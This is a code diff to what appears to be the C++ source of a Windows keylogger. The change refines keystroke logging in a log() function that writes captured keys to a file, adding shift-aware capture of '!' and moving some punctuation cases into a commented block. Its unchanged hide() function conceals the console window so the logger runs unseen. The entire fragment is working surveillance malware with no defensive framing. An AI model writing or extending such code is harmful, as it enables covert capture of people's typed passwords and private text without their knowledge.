@@ -41,16 +41,27 @@ void log()
 					write.close();
 					break;
 				}
-				else if((c > 64) && (c <92))
+				else if((c > 64) && (c < 92))
 				{
 					write << c;
 					write.close();
 					break;
 				}
+
 				else
 				{
 					switch(c)
 					{
+						case 49:
+							if(GetAsyncKeyState(0x10) != 0)
+							{
+								write << "!";
+							}
+							else
+							{
+								write << "1";
+							}
+							break;
 						case 8: write << "<Backspace>";
 							break;
 						case 9: write << "<TAB>";
@@ -62,22 +73,6 @@ void log()
 						case 32: write << " ";
 							break;
 						case 13: write << "<Enter>\n";
-							break;
-						case 14: write << "<shiftout>";
-							break;
-						case 15: write << "<shiftin>";
-							break;
-						case 33: write << " ! ";
-							break;
-						case 34: write << "doubleQuote";
-							break;
-						case 35: write << " # ";
-							break;
-						case 36: write << " $ ";
-							break;
-						case 37: write << " % ";
-							break;
-						case 38: write << " & ";
 							break;
 						default: write << c;
 					}
@@ -106,3 +101,23 @@ void hide()
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(stealth, 0);
 }
+/*  TESTING SPACE
+ *
+ * {
+								write << " ! ";
+								}
+							break;
+						case 34: write << "doubleQuote";
+							break;
+						case 35: write << " # ";
+							break;
+						case 36: write << " $ ";
+							break;
+						case 37: write << " % ";
+							break;
+						case 38: write << " & ";
+							break;
+						default: write << c;
+
+						*/
+
